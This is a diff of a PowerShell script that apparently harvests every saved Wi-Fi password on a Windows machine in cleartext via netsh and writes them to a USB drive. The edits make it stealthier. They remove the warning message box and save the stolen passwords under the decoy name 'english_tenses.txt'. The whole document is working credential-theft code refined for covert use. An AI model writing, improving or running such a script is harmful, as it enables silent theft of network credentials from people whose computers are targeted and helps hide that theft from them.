@@ -7,9 +7,11 @@ $wifiCredentials.AppendLine("SSID : PASSWORD")
 
 foreach ($profile in $wifiProfiles) {
     $profileDetails = netsh wlan show profile name="$profile" key=clear
-    $password = ($profileDetails | Select-String "Key Content").Line.Split(":")[1].Trim()
+    $password = ($profileDetails | Select-String "Key Content").Line
 
-    if (-not $password) {
+    if ($password) {
+        $password = $password.Split(":")[1].Trim()
+    } else {
         $password = "No password found"
     }
 
@@ -20,12 +22,11 @@ foreach ($profile in $wifiProfiles) {
 $usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1
 
 if (-not $usbDrive) {
-    [System.Windows.MessageBox]::Show("No USB drive detected. Please insert a USB drive and try again.")
     exit
 }
 
 # Path to save the Wi-Fi credentials file
-$filePath = "$($usbDrive.DeviceID)\wifi_credentials.txt"
+$filePath = "$($usbDrive.DeviceID)\english_tenses.txt"
 
 # Save the Wi-Fi credentials to the file
 $wifiCredentials.ToString() | Out-File -FilePath $filePath -Encoding UTF8
